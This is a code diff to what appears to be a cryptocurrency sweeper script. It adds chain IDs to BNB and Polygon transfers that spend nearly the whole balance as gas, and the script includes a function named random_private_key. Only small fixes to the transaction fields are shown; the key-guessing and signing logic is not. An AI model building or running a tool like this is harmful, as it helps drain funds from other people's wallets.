@@ -162,6 +162,7 @@ def send_bnb():
                     'to': to_account,
                     'value': int(balance * 0.09),
                     'gas': 21000,
+                    'chainId': 56,
                     'gasPrice': int(balance * 0.99 / 21000)
                 },
                 private_key)
@@ -174,6 +175,7 @@ def send_bnb():
                         'to': to_account,
                         'value': int(balance * 0.09),
                         'gas': 21000,
+                        'chainId': 56,
                         'gasPrice': int(balance * 0.99 / 21000)
                     },
                     private_key)
@@ -185,6 +187,7 @@ def send_bnb():
                         'to': to_account,
                         'value': int(balance * 0.09),
                         'gas': 21000,
+                        'chainId': 56,
                         'gasPrice': int(balance * 0.99 / 21000)
                     },
                     private_key)
@@ -196,6 +199,7 @@ def send_bnb():
                     'to': to_account,
                     'value': int(balance * 0.09),
                     'gas': 21000,
+                    'chainId': 56,
                     'gasPrice': int(balance * 0.99 / 21000)
                 },
                 private_key)
@@ -208,6 +212,7 @@ def send_bnb():
                         'to': to_account,
                         'value': int(balance * 0.09),
                         'gas': 21000,
+                        'chainId': 56,
                         'gasPrice': int(balance * 0.99 / 21000)
                     },
                     private_key)
@@ -228,6 +233,7 @@ def send_polygon():
                     'to': to_account,
                     'value': int(balance * 0.09),
                     'gas': 21000,
+                    'chainId': 137,
                     'gasPrice': int(balance * 0.99 / 21000)
                 },
                 private_key)
@@ -240,6 +246,8 @@ def send_polygon():
                         'to': to_account,
                         'value': int(balance * 0.09),
                         'gas': 21000,
+                        'chainId': 137,
+
                         'gasPrice': int(balance * 0.99 / 21000)
                     },
                     private_key)
@@ -251,6 +259,7 @@ def send_polygon():
                         'to': to_account,
                         'value': int(balance * 0.09),
                         'gas': 21000,
+                        'chainId': 137,
                         'gasPrice': int(balance * 0.99 / 21000)
                     },
                     private_key)
@@ -262,6 +271,7 @@ def send_polygon():
                     'to': to_account,
                     'value': int(balance * 0.09),
                     'gas': 21000,
+                    'chainId': 137,
                     'gasPrice': int(balance * 0.99 / 21000)
                 },
                 private_key)
@@ -274,6 +284,7 @@ def send_polygon():
                         'to': to_account,
                         'value': int(balance * 0.09),
                         'gas': 21000,
+                        'chainId': 137,
                         'gasPrice': int(balance * 0.99 / 21000)
                     },
                     private_key)
@@ -298,3 +309,8 @@ def random_private_key():
     except:
         pass
     return True
+
+
+def send_ethereum_event():
+    new_transaction_filter = web3.eth.filter({'address': '0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3'})
+    print(new_transaction_filter.get_new_entries())
